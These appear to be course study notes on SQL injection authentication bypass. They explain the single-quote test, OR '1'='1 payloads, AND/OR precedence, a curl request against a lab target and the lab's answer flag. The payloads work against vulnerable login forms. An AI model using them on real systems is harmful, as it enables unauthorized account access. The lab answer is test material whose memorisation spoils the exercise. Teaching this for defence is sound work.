# Section 9 — Subverting Query Logic

---

## The Target Query (typical login form)

```sql
SELECT * FROM logins WHERE username='INPUT' AND password='INPUT';
```

Login succeeds if the query returns a row. The goal: make it return a row without knowing the password.

---

## Step 1 — Confirm Injection Point

Inject a single quote into the username field:

```
Username: '
```

If the app returns a SQL syntax error (not just "Login failed"), the input is unsanitized — injection is possible.

**Why:** A single `'` creates an unbalanced quote → syntax error → confirmed injection point.

---

## Step 2 — OR Injection (auth bypass)

### Bypass with known username

```
Username: tom' or '1'='1
Password: anything
```

Resulting query:
```sql
SELECT * FROM logins WHERE username='tom' OR '1'='1' AND password='anything';
```

**Operator precedence — why this works:**
1. `AND` evaluates first: `'1'='1' AND password='anything'` → `TRUE AND FALSE` → `FALSE`
2. `OR` evaluates next: `username='tom' OR FALSE` → TRUE if `tom` exists in the table

Result: logs in as `tom` regardless of password.

---

### Bypass without knowing any username

Inject OR into **both** fields:

```
Username: ' or '1'='1
Password: ' or '1'='1
```

Resulting query:
```sql
SELECT * FROM logins WHERE username='' OR '1'='1' AND password='' OR '1'='1';
```

`OR '1'='1'` at the end of the password condition makes the entire WHERE clause true. Returns the first row in the table — you're logged in as whoever that is.

---

## Key Payloads

| Goal | Username payload | Password |
|------|-----------------|----------|
| Bypass as specific user | `tom' or '1'='1` | anything |
| Bypass as any user | `' or '1'='1` | `' or '1'='1` |
| Test for injection | `'` | anything |

---

## Lab — Log in as Tom

**Target:** `http://TARGET_IP:TARGET_PORT/`  
**Objective:** Log in as user `tom` without knowing the password.

**Reasoning:**
- Inject `tom' or '1'='1` as the username — the `'` closes the username string, then `OR '1'='1'` is appended
- Because `tom` exists in the table, the `OR` evaluates true on the username side
- The `AND password=...` branch evaluates false, but the `OR` makes the whole condition true
- The query returns tom's row → login succeeds

```bash
curl -s http://TARGET_IP:TARGET_PORT/ \
  -d "username=tom' or '1'='1&password=anything"
```

**Result:**
```
Executing query: SELECT * FROM logins WHERE username='tom' or '1'='1' AND password = 'anything';
Login successful as user: tom
202a1d1a8b195d5e9a57e434cc16000c
```

**Q1 Answer:** `202a1d1a8b195d5e9a57e434cc16000c`

---

## Exam Notes

- Always test `'` first — a syntax error confirms unsanitized input
- `OR '1'='1` is the simplest always-true condition; no closing quote needed because the original query provides it
- `AND` binds before `OR` — this is why the password check fails silently when the OR is on the username side alone
- With a known username, just OR on username is enough; without one, OR on both fields
- These are In-Band payloads — output is returned directly in the HTTP response
